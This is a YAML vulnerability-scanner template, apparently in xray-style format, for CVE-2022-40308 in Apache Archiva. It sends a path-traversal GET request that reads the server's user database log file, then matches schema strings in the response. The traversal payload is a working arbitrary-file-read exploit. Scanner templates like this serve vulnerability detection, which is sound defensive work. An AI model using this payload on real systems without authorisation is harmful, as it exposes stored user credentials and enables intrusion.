name: poc-yaml-apache-archiva-cve-2022-40308-arbitrary-file-read
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /repository/internal/..//../data/databases/users/log/log1.dat
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("AS SEARCHABLE, T10 AS UNSIGNED_ATTRIBUTE") && response.content_type.contains("application/octet-stream")
expression: r0()
detail:
    author: h1ei1
    links:
        - https://xz.aliyun.com/t/11979
    vulnerability:
        level: high